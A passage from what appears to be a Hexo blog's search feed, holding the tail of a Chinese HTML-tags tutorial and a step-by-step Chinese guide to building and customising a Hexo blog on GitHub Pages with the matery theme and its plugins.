operator">&lt;</span>/sup<span class="token operator">></span> 上标<span class="token operator">&lt;</span>sub<span class="token operator">></span><span class="token operator">&lt;</span>/sub<span class="token operator">></span> 下标<span class="token operator">&lt;</span>del<span class="token operator">></span><span class="token operator">&lt;</span>/del<span class="token operator">></span> 删除线<span class="token operator">&lt;</span>pre<span class="token operator">></span><span class="token operator">&lt;</span>/pre<span class="token operator">></span> 代码样式原样输出<span class="token operator">&lt;</span>font<span class="token operator">></span><span class="token operator">&lt;</span>/font<span class="token operator">></span> 规定字体属性size 字体的大小color 字体颜色</code></pre><h4 id="4-form表单"><a href="#4-form表单" class="headerlink" title="4.form表单"></a>4.form表单</h4><p><code>form</code> 表单：规定当提交表单时向何处发送表单数据</p><p><code>method</code> 提交的方法有：<code>get</code>、<code>post</code></p><p>规定在发送表单数据之前对其进行编码。</p><p><code>enctype</code> 属性可能的值：</p><pre class=" language-bash"><code class="language-bash">application/x-www-form-urlencodedmultipart/form-datatext/plain</code></pre><p><code>input</code>标签</p><ul><li>name：同样是表示的该文本输入框名称。</li><li>size：输入框的长度大小。</li><li>maxlength：输入框中允许输入字符的最大数。</li><li>value：输入框中的默认值</li><li>readonly：表示该框中只能显示，不能添加修改。</li></ul><p><code>input</code>类型</p><ul><li>type=password 密码输入框</li><li>type=file 文件上传</li><li>type=hidden 隐藏域</li><li>button 按钮</li><li>checkbox 复选框</li><li>radio 单选框</li><li>type=submit 提交按钮</li><li>type=reset 重置按钮</li></ul><h4 id="5-a-标签、img-标签、table-标签"><a href="#5-a-标签、img-标签、table-标签" class="headerlink" title="5.a 标签、img 标签、table 标签"></a>5.a 标签、img 标签、table 标签</h4><p>a 标签的作用：就是用于控制界面与页面之间的跳转，默认就是 self</p><ul><li>self：用于在当前选项卡中跳转，也就是不新建页面跳转</li><li>_blank ：用于在新的选项卡中跳转，也就是新建页面跳转</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span> target<span class="token operator">=</span><span class="token string">"self"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"http://www.baidu.com"</span> target<span class="token operator">=</span><span class="token string">"_blank"</span><span class="token operator">></span>百度<span class="token operator">&lt;</span>/a<span class="token operator">></span></code></pre><ul><li>_blank 在新窗口中打开被链接文档。</li><li>_self 默认。在相同的框架中打开被链接文档。</li><li>_parent 在父框架集中打开被链接文档。</li><li>_top 在整个窗口中打开被链接文档。</li></ul><h4 id="6-锚文本"><a href="#6-锚文本" class="headerlink" title="6.锚文本"></a>6.锚文本</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"#2"</span><span class="token operator">></span>锚点<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>a name<span class="token operator">=</span><span class="token string">"2"</span><span class="token operator">></span>锚点<span class="token operator">&lt;</span>/a<span class="token operator">></span></code></pre><h4 id="7-img-标签"><a href="#7-img-标签" class="headerlink" title="7.img 标签"></a>7.img 标签</h4><ul><li>img 元素向网页中嵌入一幅图像。</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"/image/cat.jpg"</span> alt<span class="token operator">=</span><span class="token string">"俺是猫"</span> /<span class="token operator">></span></code></pre><ul><li>alt 规定图像的替代文本。</li><li>src 规定显示图像的 url</li><li>width 规定图片的高度</li><li>height 规定图片的宽度</li></ul><h4 id="8-table-表单"><a href="#8-table-表单" class="headerlink" title="8.table 表单"></a>8.table 表单</h4><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>caption<span class="token operator">></span>我的标题<span class="token operator">&lt;</span>/caption<span class="token operator">></span>表格带标题</code></pre><ul><li>border 边框</li><li>width 宽度</li><li>height 高度</li><li>colspan 行</li><li>rowspan 竖</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>th<span class="token operator">></span><span class="token operator">&lt;</span>/th<span class="token operator">></span><span class="token operator">&lt;</span>tr<span class="token operator">></span>行<span class="token operator">&lt;</span>/tr<span class="token operator">></span><span class="token operator">&lt;</span>td<span class="token operator">></span>表格<span class="token operator">&lt;</span>/td<span class="token operator">></span></code></pre><ul><li>cellpadding 单元边与内容的空白</li><li>cellspacing 单元格的空白</li></ul><h4 id="9-列表标签"><a href="#9-列表标签" class="headerlink" title="9.列表标签"></a>9.列表标签</h4><p><strong>无序列表</strong><br>项目符号 <code>square</code> <code>circle</code> <code>disc</code></p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ul<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>/ul<span class="token operator">></span></code></pre><p><strong>有序列表</strong></p><ul><li>数字列表 默认 数字</li><li>小写字母列表</li><li>大写字母列表 A</li><li>罗马字母列表 I</li><li>小写罗马字母列表 i</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ol type<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span>--有序列表--<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span>    <span class="token operator">&lt;</span>li<span class="token operator">></span><span class="token operator">&lt;</span>/li<span class="token operator">></span><span class="token operator">&lt;</span>/ol<span class="token operator">></span></code></pre><h4 id="10-框架的使用"><a href="#10-框架的使用" class="headerlink" title="10.框架的使用"></a>10.框架的使用</h4><p><code>iframe</code>语法:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"URL"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span></code></pre><p>该<code>URL</code>指向不同的网页。</p><p><code>ifram</code>e - 设置高度与宽度</p><p><code>height</code> 和 <code>width</code> 属性用来定义<code>iframe</code>标签的高度与宽度。</p><p>属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe loading<span class="token operator">=</span><span class="token string">"lazy"</span> src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> width<span class="token operator">=</span><span class="token string">"200"</span> height<span class="token operator">=</span><span class="token string">"200"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span></code></pre><p><code>iframe</code> - 移除边框</p><p><code>frameborder</code> 属性用于定义<code>iframe</code>表示是否显示边框。</p><p>设置属性值为 “0” 移除<code>iframe</code>的边框:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> frameborder<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span></code></pre><p>使用 <code>iframe</code> 来显示目标链接页面<br><code>iframe</code> 可以显示一个目标链接的页面</p><p>目标链接的属性必须使用 <code>iframe</code> 的属性，如下实例:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"demo_iframe.htm"</span> name<span class="token operator">=</span><span class="token string">"iframe_a"</span><span class="token operator">></span><span class="token operator">&lt;</span>/iframe<span class="token operator">></span><span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"https://www.runoob.com"</span> target<span class="token operator">=</span><span class="token string">"iframe_a"</span> rel<span class="token operator">=</span><span class="token string">"noopener"</span><span class="token operator">></span>RUNOOB.COM<span class="token operator">&lt;</span>/a<span class="token operator">></span><span class="token operator">&lt;</span>/p<span class="token operator">></span></code></pre><hr><h3 id="0x004-更多详细教程"><a href="#0x004-更多详细教程" class="headerlink" title="0x004 更多详细教程"></a>0x004 更多详细教程</h3><p><a href="https://www.runoob.com/html/html-tutorial.html">HTML教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
            <tag> Web Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+github博客搭建</title>
      <link href="/2022/08/08/toc-heading-1/"/>
      <url>/2022/08/08/toc-heading-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="效果演示"><a href="#效果演示" class="headerlink" title="效果演示"></a>效果演示</h3><hr><p><img src="https://s1.ax1x.com/2022/08/08/vMsh6O.jpg" alt="效果演示"></p><hr><h3 id="0X001-简单介绍"><a href="#0X001-简单介绍" class="headerlink" title="0X001 简单介绍"></a>0X001 简单介绍</h3><hr><p>搭建博客时遇到了各种各样的问题，经过各种失败后，终于搭建好了自己的博客，。本博客基于<code>Hexo</code>框架，采用<code>hexo-theme-matery</code>主题，在这里非常感谢作者洪卫的<code>hexo-blog-fly</code>博客开源，极大简化了构建博客的工作量和复杂度。在此开源博客的基础上做了改进，修复了一些bug，顺利搭建完成了我的个人博客。大家对此主题有兴趣的可以下载源代码，搭建属于自己的个性化博客。</p><ul><li>个人博客 演示：<a href="http://cx330lm.github.io/">http://Cx330Lm.github.io</a></li></ul><hr><h3 id="0x002-HEXO初级搭建"><a href="#0x002-HEXO初级搭建" class="headerlink" title="0x002 HEXO初级搭建"></a>0x002 HEXO初级搭建</h3><hr><h4 id="1-安装git"><a href="#1-安装git" class="headerlink" title="1. 安装git"></a>1. 安装git</h4><p><code>Git</code>是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。<code>Git</code>的作用是将本地的网页文件传到<code>github</code>上。  </p><ul><li>Git<a href="https://git-scm.com/download">下载地址</a></li><li>Git<a href="https://www.liaoxuefeng.com/wiki/896043488029600">教程</a></li></ul><p>windows： 到git官网上下载.exe文件,Download git,安装选项一路默认即可。</p><h4 id="2-安装nodejs"><a href="#2-安装nodejs" class="headerlink" title="2. 安装nodejs"></a>2. 安装nodejs</h4><p>Hexo是基于<code>node.js</code>编写的，所以需要安装一下<code>node.js</code>和里面的<code>npm</code>工具。  </p><p>windows： 到<a href="http://nodejs.cn/download/">Node.js官网</a>下载.exe文件，安装选项全部默认。安装好之后，按<code>Win+R</code>打开<code>cmd</code>命令提示符，输入<code>node -v</code>和<code>npm -v</code>，若出现版本号，则说明安装成功。</p><h4 id="3-添加npm国内源"><a href="#3-添加npm国内源" class="headerlink" title="3. 添加npm国内源"></a>3. 添加npm国内源</h4><p>使用阿里的国内镜像进行加速下载</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token keyword">set</span> registry https://registry.npm.taobao.org</code></pre><h4 id="4-安装Hexo"><a href="#4-安装Hexo" class="headerlink" title="4. 安装Hexo"></a>4. 安装Hexo</h4><p>前面<code>git</code>和<code>nodejs</code>安装好后，就可以安装<code>hexo</code>了，你可以先创建一个文件夹<code>MyBlog</code>，用来存放自己的博客文件，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接右键<code>git bash</code>打开）。</p><p>比如我的博客文件都存放在D:\MyBlog目录下。  </p><p>在该目录下右键点击<code>Git Bash Here</code>，打开<code>git</code>的控制台窗口，以后我们所有的操作都在<code>git</code>控制台进行，就不用<code>Windows</code>自带的<code>cmd</code>了。</p><p>定位到该目录下，输入一下代码安装Hexo。可能会有几个报错，不用理会。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli</code></pre><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>到此为止<code>hexo</code>就安装完了。</p><p>接下来初始化一下<code>hexo</code>,即初始化我们的网站，输入<code>hexo init</code>初始化文件夹</p><pre class=" language-bash"><code class="language-bash">hexo init MyBlog</code></pre><p>新建完成后，指定文件夹MyBlog目录下有：</p><ul><li>node_modules: 依赖包</li><li>public：存放生成的页面</li><li>scaffolds：生成文章的一些模板</li><li>source：用来存放你的文章</li><li>themes：主题文件存放位置</li><li>_config.yml: 博客的配置文件</li></ul><p>到此为止，本地的网站配置完成了。</p><p>输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>打开本地服务器</p><pre class=" language-bash"><code class="language-bash">hexo ghexo s</code></pre><p><img src="https://s1.ax1x.com/2022/08/08/vMRjcq.png" alt="hexo"></p><h4 id="5-注册Github账号创建个人仓库"><a href="#5-注册Github账号创建个人仓库" class="headerlink" title="5. 注册Github账号创建个人仓库"></a>5. 注册Github账号创建个人仓库</h4><p>接下来就去注册一个<code>github</code>账号，用来存放我们的网站。</p><p>打开<code>https://github.com/</code>，新建一个项目仓库<code>New repository</code>，如下所示：</p><p><img src="https://s1.ax1x.com/2022/08/08/vMoPUK.png" alt="image"></p><p>然后如下图所示，输入自己的项目名字，后面一定要加<code>.github.io</code>后缀，注意图片上面的标注，红色框圈出来的内容必须一样，否则会报错。</p><p><img src="https://s1.ax1x.com/2022/08/08/vMo82Q.jpg" alt="image"></p><blockquote><p>注意：<br>要创建一个和你用户名相同的仓库，后面加<code>.github.io</code>，只有这样，将来要部署到<code>GitHub page</code>的时候，才会被识别，也就是<code>https://xxxx.github.io</code>，其中<code>xxx</code>就是你注册<code>GitHub</code>的用户名。<br>例如我的：<a href="https://cx330lm.github.io/">https://Cx330Lm.github.io</a></p></blockquote><h4 id="6-生成SSH添加到GitHub"><a href="#6-生成SSH添加到GitHub" class="headerlink" title="6. 生成SSH添加到GitHub"></a>6. 生成SSH添加到GitHub</h4><p>生成<code>SSH</code>添加到<code>GitHub</code>，连接<code>Github</code>与本地。</p><p>右键打开<code>git bash here</code>，然后输入下面命令：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> config --global user.name <span class="token string">"注册GitHub用户名"</span><span class="token function">git</span> config --global user.email <span class="token string">"注册GitHub的邮箱"</span></code></pre><p>一下两条命令用于检查你设置的<code>GitHub</code>用户名和邮箱是否正确</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> config user.name<span class="token function">git</span> config user.email</code></pre><p>然后创建<code>SSH</code>,一路回车即可</p><pre class=" language-bash"><code class="language-bash">ssh-keygen -t rsa -C <span class="token string">"注册GitHub的邮箱"</span></code></pre><p>这个时候它会告诉你已经生成了<code>.ssh</code>的文件夹。你可以在<code>git bash</code>中输入一下命令进行查看</p><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> ~/.ssh/id_rsa.pub</code></pre><p>将输出的内容复制到框中，点击确定保存。</p><p>打开<code>github</code>，在头像下面点击<code>settings</code>，再点击<code>SSH and GPG keys</code>，新建一个<code>SSH</code>，名字随便取一个都可以，把你的<code>id_rsa.pub</code>里面的信息粘贴进去。如图：</p><p><img src="https://s1.ax1x.com/2022/08/08/vMT3o6.png" alt="image"></p><p>在<code>git bash</code>输入如下命令，如果出现你的用户名，那就成功了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> -T git@github.com</code></pre><h4 id="7-将hexo部署到GitHub"><a href="#7-将hexo部署到GitHub" class="headerlink" title="7. 将hexo部署到GitHub"></a>7. 将hexo部署到GitHub</h4><p>将hexo生成的文章部署到<code>GitHub</code>上，打开博客根目录下的<code>_config.yml</code>文件，这是博客的配置文件，在这里你可以修改与博客配置相关的各种信息。</p><p>找到如下配置进行修改：</p><pre class=" language-bash"><code class="language-bash">deploy:  type: <span class="token function">git</span>  repository: https://github.com/Cx330Lm/Cx330Lm.github.io  branch: master</code></pre><p><code>repository</code>修改为你自己的github项目地址即可，就是部署时，告诉工具，将生成网页通过<code>git</code>方式上传到你对应的链接仓库中。</p><p>这个时候需要先安装<code>deploy-git</code> ，也就是部署的命令,这样你才能用命令部署到<code>GitHub</code>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save</code></pre><p>然后就可以部署提交到<code>github</code>，过一会儿就可以在<code>http://yourname.github.io</code> 这个网站看到你的博客了</p><pre class=" language-bash"><code class="language-bash">hexo cleanhexo generatehexo deploy</code></pre><p>其中<code>hexo clean</code>清除了你之前生成的东西。 <code>hexo generate</code>，生成静态文章，可以用 <code>hexo g</code>缩写 ，<code>hexo deploy</code>部署文章，可以用<code>hexo d</code>缩写</p><blockquote><p>注意: deploy 可能要你输入GitHub的username和password。</p></blockquote><h4 id="8-写文章和发布文章"><a href="#8-写文章和发布文章" class="headerlink" title="8. 写文章和发布文章"></a>8. 写文章和发布文章</h4><p>首先在博客根目录下右键打开<code>git bash here</code>，安装一个扩展<code>npm i hexo-deployer-git</code>。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i hexo-deployer-git</code></pre><p>然后输入<code>hexo new post "article title"</code>，新建一篇文章。</p><pre class=" language-bash"><code class="language-bash">hexo new post <span class="token string">"article title"</span></code></pre><p>然后打开<code>D:\MyBlog\source\_posts</code>的目录，可以发现下面多了一个文件夹和一个<code>.md</code>文件，一个用来存放你的图片等数据，另一个就是你的文章文件。</p><p>另外推荐直接使用有道云编写<code>markdown</code>文章，不仅可以实时预览，还可以快捷的生成<code>markdown</code>语法格式，或者也可以去 <a href="https://www.runoob.com/markdown/md-tutorial.html">MarkDown教程</a> 查看用法。</p><p>编写完<code>markdown</code>文件后，根目录下输入<code>hexo g</code>生成静态网页，然后输入<code>hexo s</code>可以本地预览效果，最后输入<code>hexo d</code>上传到<code>github</code>上。这时打开你的<code>github.io</code>主页就能看到发布的文章了。</p><p>到此为止，<code>Hexo</code>初级搭建就已经完成了。</p><h3 id="0x003-个性化定制"><a href="#0x003-个性化定制" class="headerlink" title="0x003 个性化定制"></a>0x003 个性化定制</h3><hr><h4 id="1-Hexo相关目录文件"><a href="#1-Hexo相关目录文件" class="headerlink" title="1. Hexo相关目录文件"></a>1. Hexo相关目录文件</h4><h5 id="1-1-博客目录构成介绍"><a href="#1-1-博客目录构成介绍" class="headerlink" title="1.1 博客目录构成介绍"></a>1.1 博客目录构成介绍</h5><p><code>node_modules</code>是<code>node.js</code>各种库的目录，<code>public</code>是生成的网页文件目录，<code>scaffolds</code>里面就三个文件，存储着新文章和新页面的初始设置，<code>source</code>是我们最常用到的一个目录，里面存放着文章、各类页面、图像等文件，<code>themes</code>存放着主题文件，一般也用不到。</p><p>我们平时写文章只需要关注<code>source/_posts</code>这个文件夹就行了。</p><pre class=" language-bash"><code class="language-bash">- node_modules- public- scaffolds- <span class="token function">source</span>    - _data    - _posts    - about    - archives    - categories    - friends    - tags- themes</code></pre><h5 id="1-2-Hexo基本设置"><a href="#1-2-Hexo基本设置" class="headerlink" title="1.2 Hexo基本设置"></a>1.2 Hexo基本设置</h5><p>在文件根目录下的<code>_config.yml</code>，就是整个<code>hexo</code>框架的配置文件了。可以在里面修改大部分的配置。详细可参考官方的<a href="https://hexo.io/zh-cn/docs/configuration">配置描述</a>。</p><h6 id="1-2-1-网站"><a href="#1-2-1-网站" class="headerlink" title="1.2.1 网站"></a>1.2.1 网站</h6><p>参数描述<code>title</code>网站标题<code>subtitle</code>网站副标题<code>description</code>网站描述<code>author</code>您的名字<code>language</code>网站使用的语言<code>timezone</code>网站时区。<code>Hexo</code> 默认使用您电脑的时区。时区列表。比如说：<code>America/New_York, Japan</code> 和 <code>UTC</code> 。</p><p>其中，<code>description</code>主要用于<code>SEO</code>，告诉搜索引擎一个关于您站点的简单描述，通常建议在其中包含您网站的关键词。<code>author</code>参数用于主题显示文章的作者。</p><h6 id="1-2-2-网址"><a href="#1-2-2-网址" class="headerlink" title="1.2.2 网址"></a>1.2.2 网址</h6><p>参数描述<code>url</code>网址<code>root</code>网站根目录 <code>permalink</code>文章的永久链接格式<code>permalink_defaults</code><a href="https://hexo.io/zh-cn/docs/permalinks">永久链接</a>中各部分的默认值</p><p>在这里，你需要把<code>url</code>改成你的网站域名。</p><p><code>permalink</code>，也就是你生成某个文章时的那个链接格式。</p><p>比如我新建一个文章叫<code>temp.md</code>，那么这个时候他自动生成的地址就是<code>http://yoursite.com/2018/09/05/temp</code>。</p><p>以下是官方给出的示例，关于链接的变量还有很多，需要的可以去官网上查找<a href="https://hexo.io/zh-cn/docs/permalinks">永久链接</a> 。</p><pre class=" language-bash"><code class="language-bash">参数结果:year/:month/:day/:title       /2019/08/10/hello-world :year-:month-:day-:title.html  2019-08-10-hello-world.html :category/:titlefoo            /bar/hello-world</code></pre><h4 id="2-定制主题"><a href="#2-定制主题" class="headerlink" title="2. 定制主题"></a>2. 定制主题</h4><p>这里推荐作者洪卫的<code>hexo-blog-fly</code>博客主题，该主题是基于<code>hexo-theme-matery</code>优化的，需要把博客相关信息换成您自己的就可以部署了，极大简化了构建博客的工作量和复杂度。</p><h5 id="2-1-简单使用方法"><a href="#2-1-简单使用方法" class="headerlink" title="2.1 简单使用方法"></a>2.1 简单使用方法</h5><ol><li>安装Git, 安装nodeJS，安装Hexo</li><li>你可以直接fork一份源码到你的仓库，clone到本地博客文件夹内</li><li>在本地博客仓库运行npm i命令安装依赖包</li><li>直接修改配置信息，改成自己的信息</li><li>运行命令hexo clean（清除生成文件），hexo g（生成网页）， hexo s（本地预览），hexo d（部署）</li></ol><blockquote><p>这里我不推荐使用简单方法设置主题，Hexo版本之间的兼容性较差，如果不清楚博主使用的哪个版本的<code>hexo</code>，我建议还是手动进行设置主题。</p></blockquote><h5 id="2-2-原主题特性"><a href="#2-2-原主题特性" class="headerlink" title="2.2 原主题特性"></a>2.2 原主题特性</h5><ul><li>简单漂亮，文章内容美观易读</li><li>Material Design 设计</li><li>响应式设计，博客在桌面端、平板、手机等设备上均能很好的展现</li><li>首页轮播文章及每天动态切换 Banner 图片</li><li>瀑布流式的博客文章列表（文章无特色图片时会有 24 张漂亮的图片代替）</li><li>时间轴式的归档页</li><li>词云的标签页和雷达图的分类页</li><li>丰富的关于我页面（包括关于我、文章统计图、我的项目、我的技能、相册等）</li><li>可自定义的数据的友情链接页面</li><li>支持文章置顶和文章打赏</li><li>支持 MathJax</li><li>TOC 目录</li><li>可设置复制文章内容时追加版权信息</li><li>可设置阅读文章时做密码验证</li><li>Gitalk、Gitment、Valine 和 Disqus 评论模块（推荐使用 Gitalk）</li><li>集成了不蒜子统计、谷歌分析（Google Analytics）和文章字数统计等功能</li><li>支持在首页的音乐播放和视频播放功能</li></ul><h5 id="2-3-新增加特性"><a href="#2-3-新增加特性" class="headerlink" title="2.3 新增加特性"></a>2.3 新增加特性</h5><ul><li>修改了原主题的一些很多bug</li><li>加入图片懒加载功能，在根目录配置文件开启和关闭</li><li>增加留言板功能</li><li>在关于板块,加入简历功能页</li><li>增加视听[视觉听觉影音]板块</li><li>支持emoji表情，用markdown emoji语法书写直接生成对应的能跳跃的表情。</li><li>增加网站运行时间显示</li><li>增加动漫模型</li><li>整体替换Banner图片和文章特色图片</li><li>增加分类相册功能</li><li>修改了一些控件的参数</li><li>修改部分样式,比如: 文章卡片,固定高度,使其不至于因为文章摘要的长短不同导致卡片大小不一使页面布局很不美观,类似的还有友链卡片,优化了页面内容布局,视觉更整齐美观</li><li>解决首页文章列表卡片上方 border-radius圆角失效的bug</li><li>添加页面樱花飘落动效</li><li>添加鼠标点击烟花爆炸动效</li><li>加入天气接口控件</li><li>加入鼠标点击文字特效</li><li>添加页面雪花飘落动效</li><li>添加在线聊天插件</li><li>调整线聊天插件参数，使之能够随着鼠标滑动位置自适应调整</li></ul><hr><h5 id="2-4-切换主题"><a href="#2-4-切换主题" class="headerlink" title="2.4 切换主题"></a>2.4 切换主题</h5><p>如果想自己动手对<code>hexo-theme-matery</code>优化的话，可以修改<code>Hexo</code>根目录下的<code>_config.yml</code>的 <code>theme</code> 的值</p><pre class=" language-bash"><code class="language-bash">theme: hexo-theme-matery</code></pre><p><code>_config.yml</code> 文件的其它修改建议:</p><ul><li>请修改 <code>_config.yml</code> 的 <code>url</code> 的值为你的网站主 <code>URL</code>（如：<code>http://xxx.github.io</code>）。</li><li>建议修改两个 <code>per_page</code> 的分页条数值为 6 的倍数，如：12、18 等，这样文章列表在各个屏幕下都能较好的显示。</li><li>如果你是中文用户，则建议修改 <code>language</code> 的值为 <code>zh-CN</code>。</li></ul><h5 id="2-5-新建页面"><a href="#2-5-新建页面" class="headerlink" title="2.5 新建页面"></a>2.5 新建页面</h5><p>例如：<code>tags</code> 页是用来展示所有标签的页面，如果在你的博客 <code>source</code> 目录下还没有 <code>tags/index.md</code> 文件，那么你就需要新建一个，命令如下：</p><pre class=" language-bash"><code class="language-bash">hexo new page <span class="token string">"tags"</span></code></pre><p>编辑你刚刚新建的页面文件 <code>/source/tags/index.md</code>，至少需要以下内容：</p><pre class=" language-bash"><code class="language-bash">---title: tagsdate: 2018-09-30 18:23:38type: <span class="token string">"tags"</span>layout: <span class="token string">"tags"</span>---</code></pre><blockquote><p>其他页面的创建方法也是一样，这里就不多阐述</p></blockquote><h5 id="2-6-代码高亮"><a href="#2-6-代码高亮" class="headerlink" title="2.6 代码高亮"></a>2.6 代码高亮</h5><p>由于 <code>Hexo</code> 自带的代码高亮主题显示不好看，所以主题中使用到了 <code>hexo-prism-plugin</code> 的 <code>Hexo</code> 插件来做代码高亮，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i -S hexo-prism-plugin</code></pre><p>然后，修改 <code>Hexo</code> 根目录下 <code>_config.yml</code> 文件中 <code>highlight.enable</code> 的值为 <code>false</code>，并新增 <code>prism</code> 插件相关的配置，主要配置如下：</p><pre class=" language-bash"><code class="language-bash">highlight:  enable: <span class="token boolean">false</span>prism_plugin:  mode: <span class="token string">'preprocess'</span>    <span class="token comment" spellcheck="true"># realtime/preprocess</span>  theme: <span class="token string">'tomorrow'</span>  line_number: <span class="token boolean">false</span>    <span class="token comment" spellcheck="true"># default false</span>  custom_css:</code></pre><h5 id="2-7-搜索"><a href="#2-7-搜索" class="headerlink" title="2.7 搜索"></a>2.7 搜索</h5><p>本主题中还使用到了 <code>hexo-generator-search</code> 的 <code>Hexo</code> 插件来做内容搜索，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save</code></pre><p>在 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-bash"><code class="language-bash">search:  path: search.xml  field: post</code></pre><h5 id="2-8-文章字数统计插件（建议安装）"><a href="#2-8-文章字数统计插件（建议安装）" class="headerlink" title="2.8 文章字数统计插件（建议安装）"></a>2.8 文章字数统计插件（建议安装）</h5><p>如果你想要在文章中显示文章字数、阅读时长信息，可以安装 <code>hexo-wordcount</code> 插件。</p><p>安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> i --save hexo-wordcount</code></pre><p>然后只需在本主题下的 <code>_config.yml</code> 文件中，将各个文章字数相关的配置激活即可：</p><pre class=" language-bash"><code class="language-bash">postInfo:  date: <span class="token boolean">true</span>  update: <span class="token boolean">false</span>  wordCount: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 设置文章字数统计为 true.</span>  totalCount: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 设置站点文章总字数统计为 true.</span>  min2read: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 阅读时长.</span>  readCount: <span class="token boolean">false</span> <span class="token comment" spellcheck="true"># 阅读次数.</span></code></pre><h5 id="2-9-添加emoji表情支持（可选的）"><a href="#2-9-添加emoji表情支持（可选的）" class="headerlink" title="2.9 添加emoji表情支持（可选的）"></a>2.9 添加emoji表情支持（可选的）</h5><p>本主题新增了对<code>emoji</code>表情的支持，使用到了 <code>hexo-filter-github-emojis</code> 的 <code>Hexo</code> 插件来支持 <code>emoji</code>表情的生成，把对应的<code>markdown emoji</code>语法（::,例如：:<code>smile:</code>）转变成会跳跃的<code>emoji</code>表情，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-filter-github-emojis --save</code></pre><p>在 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-bash"><code class="language-bash">githubEmojis:  enable: <span class="token boolean">true</span>  className: github-emoji  inject: <span class="token boolean">true</span>  styles:  customEmojis:</code></pre><h5 id="2-10-添加-RSS-订阅支持（可选的）"><a href="#2-10-添加-RSS-订阅支持（可选的）" class="headerlink" title="2.10 添加 RSS 订阅支持（可选的）"></a>2.10 添加 RSS 订阅支持（可选的）</h5><p>本主题中还使用到了<code>hexo-generator-feed</code> 的 <code>Hexo</code> 插件来做 <code>RSS</code>，安装命令如下：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-feed --save</code></pre><p>在 <code>Hexo</code> 根目录下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p><pre class=" language-bash"><code class="language-bash">feed:  type: atom  path: atom.xml  limit: 20  hub:  content:  content_limit: 140  content_limit_delim: <span class="token string">' '</span>  order_by: -date</code></pre><p>执行 